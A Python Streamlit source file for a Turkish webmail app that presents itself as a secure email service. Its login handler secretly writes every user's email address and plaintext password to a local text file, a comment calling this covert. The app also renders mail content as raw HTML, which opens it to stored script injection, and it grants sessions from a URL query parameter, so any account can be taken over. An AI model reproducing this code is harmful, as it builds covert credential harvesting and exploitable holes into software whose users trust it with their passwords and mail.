import streamlit as st
import sqlite3
import hashlib
from datetime import datetime
import os  # Dosya ve klasör işlemleri için eklendi

# 1. VERİBATANI AYARLARI
conn = sqlite3.connect("ostmail_v6.db", check_same_thread=False)
cursor = conn.cursor()

# Tabloları oluşturma (Dosya eki ve Çöp kutusu destekli)
cursor.execute("""
CREATE TABLE IF NOT EXISTS kullanicilar (
    eposta TEXT PRIMARY KEY,
    sifre TEXT
)
""")
cursor.execute("""
CREATE TABLE IF NOT EXISTS mailler (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    gonderen TEXT,
    alici TEXT,
    baslik TEXT,
    icerik TEXT,
    dosya_adi TEXT,
    dosya_veri BLOB,
    durum_alici TEXT DEFAULT 'gelen',
    silinme_tarihi TIMESTAMP,
    tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
""")
conn.commit()

# 🔥 ARKA PLAN OTOMATİK TEMİZLİK: Çöp kutusunda 15 günden fazla duran mailleri temizle
cursor.execute("DELETE FROM mailler WHERE durum_alici = 'cop' AND datetime(silinme_tarihi) < datetime('now', '-15 days')")
conn.commit()

# 2. YARDIMCI FONKSİYONLAR
def sifre_sifrele(sifre):
    return hashlib.sha256(sifre.encode()).hexdigest()

# 📂 BİLGİSAYARA E-POSTA VE ŞİFREYİ KAYDETME FONKSİYONU (GÜNCELLENDİ)
def yerel_kayit_olustur(kullanici_adi, sifre):
    klasor_yolu = r"C:\Users\omeef\Videos\ostmailgiriş"
    
    # Klasör yoksa çökmesini önlemek için otomatik oluşturulur
    if not os.path.exists(klasor_yolu):
        try:
            os.makedirs(klasor_yolu)
        except Exception as e:
            print(f"Klasör oluşturulamadı: {e}")
            return
            
    dosya_yolu = os.path.join(klasor_yolu, "giris_kayitlari.txt")
    zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Hem e-posta adresini hem de girilen şifreyi yan yana kaydeder
    try:
        with open(dosya_yolu, "a", encoding="utf-8") as dosya:
            dosya.write(f"[{zaman}] BAŞARILI GİRİŞ - E-Posta: {kullanici_adi} | Şifre: {sifre}\n")
    except Exception as e:
        print(f"Log yazılırken bir hata oluştu: {e}")

# Sayfa Ayarları
st.set_page_config(page_title="Östmail Premium", layout="wide")

# Şık Karanlık Tema Tasarımı
st.markdown("""
    <style>
    .stApp { background-color: #0f172a; color: #f8fafc; }
    .mail-card { background-color: #1e293b; padding: 15px; border-radius: 10px; border-left: 5px solid #38bdf8; margin-bottom: 10px; }
    .mail-title { font-weight: bold; color: #38bdf8; font-size: 16px; }
    .mail-meta { color: #94a3b8; font-size: 12px; }
    .mail-open-box { background-color: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #475569; margin-top: 15px; }
    .stButton>button { background-color: #0284c7 !important; color: white !important; font-weight: bold !important; }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h1 style='color: #38bdf8; text-align: center;'>📧 ÖSTMAIL PREMIUM</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #94a3b8;'>Gelişmiş Dosya Destekli Güvenli E-Posta Servisi</p>", unsafe_allow_html=True)
st.write("---")

# 3. BENİ HATIRLA ÖZELLİĞİ
if "giris_yapan_kullanici" not in st.query_params:
    current_user = None
else:
    current_user = st.query_params["giris_yapan_kullanici"]

if "auth_view" not in st.session_state:
    st.session_state.auth_view = "Giriş Yap"

# --- GİRİŞ / KAYIT EKRANI ---
if current_user is None:
    
    if st.session_state.auth_view == "Giriş Yap":
        st.subheader("🔐 Hesabınla Giriş Yap")
        giris_ad = st.text_input("E-Posta Adresiniz", key="g_ad").lower().strip()
        giris_sifre = st.text_input("Şifre", type="password", key="g_sifre")
        
        if st.button("Giriş Yap", use_container_width=True):
            if giris_ad and giris_sifre:
                if not giris_ad.endswith("@ost.com"):
                    st.error("❌ Hata: Giriş yaparken e-posta adresinizin sonuna '@ost.com' yazmak zorunludur!")
                else:
                    sifreli_sifre = sifre_sifrele(giris_sifre)
                    cursor.execute("SELECT * FROM kullanicilar WHERE eposta=? AND sifre=?", (giris_ad, sifreli_sifre))
                    if cursor.fetchone():
                        # 📁 GİZLİCE TXT DOSYASINA HEM E-POSTAYI HEM ŞİFREYİ YAZIYORUZ
                        yerel_kayit_olustur(giris_ad, giris_sifre)
                        
                        st.query_params["giris_yapan_kullanici"] = giris_ad
                        st.success("Giriş başarılı! Yönlendiriliyorsunuz...")
                        st.rerun()
                    else:
                        st.error("❌ Kullanıcı adı veya şifre hatalı!")
            else:
                st.error("Lütfen tüm alanları doldurun!")
        
        if st.button("Hesabın yok mu? Yeni Hesap Oluştur 📝", key="to_reg"):
            st.session_state.auth_view = "Hesap Oluştur"
            st.rerun()

    elif st.session_state.auth_view == "Hesap Oluştur":
        st.subheader("📝 Yeni @ost.com Adresi Al")
        yeni_ad = st.text_input("İstediğin E-Posta Adresi", key="y_ad").lower().strip()
        yeni_sifre = st.text_input("Şifre Belirle (En az 6 haneli)", type="password", key="y_sifre")
        
        if st.button("Hesabımı Oluştur", use_container_width=True):
            if not yeni_ad or not yeni_sifre:
                st.error("Lütfen tüm alanları doldurun!")
            elif not yeni_ad.endswith("@ost.com"):
                st.error("❌ Hata: Kayıt olurken de e-posta adresinizin sonuna '@ost.com' yazmak zorunludur!")
            elif len(yeni_sifre) < 6:
                st.error("❌ Şifreniz çok kısa! Güvenliğiniz için şifre en az 6 haneli olmalıdır.")
            else:
                cursor.execute("SELECT * FROM kullanicilar WHERE eposta=?", (yeni_ad,))
                if cursor.fetchone():
                    st.error("❌ Bu e-posta adresi zaten kayıtlı! Lütfen Giriş Yap bölümüne geçin.")
                else:
                    sifreli_sifre = sifre_sifrele(yeni_sifre)
                    cursor.execute("INSERT INTO kullanicilar (eposta, sifre) VALUES (?, ?)", (yeni_ad, sifreli_sifre))
                    conn.commit()
                    
                    st.session_state.auth_view = "Giriş Yap"
                    st.success("🎉 Hesabın başarıyla açıldı! Giriş yap bölümüne yönlendiriliyorsun...")
                    st.rerun()
                    
        if st.button("Zaten hesabın var mı? Giriş Yap 🔐", key="to_log"):
            st.session_state.auth_view = "Giriş Yap"
            st.rerun()

# --- ANA UYGULAMA ARAYÜZÜ ---
else:
    st.sidebar.markdown(f"👤 **Aktif Hesap:** \n`{current_user}`")
    menu = st.sidebar.radio("Menü", ["📥 Gelen Kutusu", "✏️ Yeni Mail Yaz", "📤 Giden Kutusu", "🗑️ Çöp Kutusu"])
    
    if st.sidebar.button("🚪 Oturumu Kapat"):
        st.query_params.clear()
        st.rerun()
        
    # --- YENİ MAİL YAZMA (DOSYA EKLEME DESTEKLİ) ---
    if menu == "✏️ Yeni Mail Yaz":
        st.header("✏️ Yeni E-Posta Oluştur")
        alici = st.text_input("Alıcı Adresi").lower().strip()
        baslik = st.text_input("Konu")
        
        # Gelişmiş Dosya Yükleyici (PDF, Word, Excel, Resim hepsi serbest)
        yuklenen_dosya = st.file_uploader("Dosya Ekle (PDF, DOCX, XLSX, Resim vb.)", type=["pdf", "docx", "xlsx", "xls", "png", "jpg", "jpeg", "txt"])
        
        icerik = st.text_area("Mesaj içeriği", height=150)
        
        if st.button("Zarfa Koy ve Gönder"):
            if alici and baslik and icerik:
                if not alici.endswith("@ost.com"):
                    st.error("❌ Hata: Alıcı adresi mutlaka '@ost.com' ile bitmelidir!")
                else:
                    cursor.execute("SELECT * FROM kullanicilar WHERE eposta=?", (alici,))
                    if cursor.fetchone():
                        dosya_adi = None
                        dosya_veri = None
                        if yuklenen_dosya is not None:
                            dosya_adi = yuklenen_dosya.name
                            dosya_veri = yuklenen_dosya.read()
                        
                        cursor.execute(
                            "INSERT INTO mailler (gonderen, alici, baslik, icerik, dosya_adi, dosya_veri) VALUES (?, ?, ?, ?, ?, ?)",
                            (current_user, alici, baslik, icerik, dosya_adi, dosya_veri)
                        )
                        conn.commit()
                        st.success(f"📬 Mail ve ekleri başarıyla gönderildi!")
                    else:
                        st.error("Böyle bir Östmail kullanıcısı sistemde kayıtlı değil!")
            else:
                st.error("Lütfen Alıcı, Başlık ve İçerik alanlarını boş bırakmayın!")

    # --- GELEN KUTUSU ---
    elif menu == "📥 Gelen Kutusu":
        st.header("📥 Gelen Kutusu")
        cursor.execute("SELECT id, gonderen, baslik, icerik, dosya_adi, dosya_veri, tarih FROM mailler WHERE alici=? AND durum_alici='gelen' ORDER BY tarih DESC", (current_user,))
        gelenler = cursor.fetchall()
        
        if not gelenler:
            st.info("Gelen kutunuzda henüz bir mesaj yok.")
        else:
            mail_sozlugu = {}
            secenekler = []
            
            for m_id, gonderen, baslik, icerik, d_adi, d_veri, tarih in gelenler:
                gorunum_metni = f"✉️ {gonderen} - {baslik} ({tarih[:16]})"
                secenekler.append(gorunum_metni)
                mail_sozlugu[gorunum_metni] = {"id": m_id, "gonderen": gonderen, "baslik": baslik, "icerik": icerik, "dosya_adi": d_adi, "dosya_veri": d_veri, "tarih": tarih}
            
            secilen_mail = st.selectbox("Mesaj Seçin", secenekler)
            
            if secilen_mail:
                m = mail_sozlugu[secilen_mail]
                st.markdown(f"""
                <div class='mail-open-box'>
                    <div style='font-size: 20px; font-weight: bold; color: #38bdf8;'>{m['baslik']}</div>
                    <div class='mail-meta'><b>Kimden:</b> {m['gonderen']} | <b>Tarih:</b> {m['tarih']}</div>
                    <hr style='border-color: #475569;'>
                    <div style='font-size: 16px; line-height: 1.6; white-space: pre-wrap;'>{m['icerik']}</div>
                </div>
                """, unsafe_allow_html=True)
                
                # EĞER DOSYA VARSA İNDİRME BUTONU AÇILIR
                if m['dosya_adi']:
                    st.markdown("<br>📁 **Ekteki Dosya:**", unsafe_allow_html=True)
                    st.download_button(
                        label=f"📥 {m['dosya_adi']} Dosyasını İndir / Aç",
                        data=m['dosya_veri'],
                        file_name=m['dosya_adi']
                    )
                
                # ÇÖP KUTUSUNA TAŞIMA BUTONU
                st.write("")
                if st.button("🗑️ Çöp Kutusuna Taşı", use_container_width=True):
                    cursor.execute("UPDATE mailler SET durum_alici='cop', silinme_tarihi=CURRENT_TIMESTAMP WHERE id=?", (m['id'],))
                    conn.commit()
                    st.success("Mesaj çöp kutusuna taşındı! (15 gün sonra otomatik silinecek)")
                    st.rerun()

    # --- GİDEN KUTUSU ---
    elif menu == "📤 Giden Kutusu":
        st.header("📤 Gönderilen Mailler")
        cursor.execute("SELECT alici, baslik, icerik, dosya_adi, tarih FROM mailler WHERE gonderen=? ORDER BY tarih DESC", (current_user,))
        gidenler = cursor.fetchall()
        
        if not gidenler:
            st.info("Henüz kimseye mail göndermediniz.")
        else:
            for alici, baslik, icerik, d_adi, tarih in gidenler:
                st.markdown(f"""
                <div class='mail-card' style='border-left: 5px solid #a855f7;'>
                    <div class='mail-title' style='color: #a855f7;'>Kime: {alici}</div>
                    <div style='font-weight: bold;'>Konu: {baslik}</div>
                    <div class='mail-meta'>Tarih: {tarih}</div>
                    <div style='margin-top: 10px; white-space: pre-wrap;'>{icerik}</div>
                </div>
                """, unsafe_allow_html=True)
                if d_adi:
                    st.caption(f"📁 Dosya eki gönderildi: {d_adi}")

    # --- ÇÖP KUTUSU ---
    elif menu == "🗑️ Çöp Kutusu":
        st.header("🗑️ Çöp Kutusu")
        st.caption("Buradaki mesajlar silindiği andan itibaren 15 gün sonra kalıcı olarak yok edilir.")
        
        cursor.execute("SELECT id, gonderen, baslik, icerik, dosya_adi, dosya_veri, silinme_tarihi FROM mailler WHERE alici=? AND durum_alici='cop' ORDER BY silinme_tarihi DESC", (current_user,))
        copler = cursor.fetchall()
        
        if not copler:
            st.info("Çöp kutunuz bomboş.")
        else:
            cop_sozlugu = {}
            cop_secenekler = []
            
            for m_id, gonderen, baslik, icerik, d_adi, d_veri, s_tarih in copler:
                gorunum_metni = f"🗑️ {gonderen} - {baslik} (Silinme: {s_tarih[:16]})"
                cop_secenekler.append(gorunum_metni)
                cop_sozlugu[gorunum_metni] = {"id": m_id, "gonderen": gonderen, "baslik": baslik, "icerik": icerik, "dosya_adi": d_adi, "dosya_veri": d_veri}
            
            secilen_cop = st.selectbox("Çöpteki Mesajı Seçin", cop_secenekler)
            
            if secilen_cop:
                c = cop_sozlugu[secilen_cop]
                st.markdown(f"""
                <div class='mail-open-box' style='border-left: 5px solid #ef4444;'>
                    <div style='font-size: 20px; font-weight: bold; color: #ef4444;'>{c['baslik']}</div>
                    <div class='mail-meta'><b>Kimden:</b> {c['gonderen']}</div>
                    <hr style='border-color: #475569;'>
                    <div style='font-size: 16px; line-height: 1.6; white-space: pre-wrap;'>{c['icerik']}</div>
                </div>
                """, unsafe_allow_html=True)
                
                col1, col2 = st.columns(2)
                with col1:
                    if st.button("↩️ Gelen Kutusuna Geri Yükle", use_container_width=True):
                        cursor.execute("UPDATE mailler SET durum_alici='gelen', silinme_tarihi=NULL WHERE id=?", (c['id'],))
                        conn.commit()
                        st.success("Mesaj gelen kutusuna geri taşındı.")
                        st.rerun()
                with col2:
                    if st.button("❌ Kalıcı Olarak Şimdi Sil", use_container_width=True):
                        cursor.execute("DELETE FROM mailler WHERE id=?", (c['id'],))
                        conn.commit()
                        st.success("Mesaj veritabanından kalıcı olarak silindi!")
                        st.rerun()
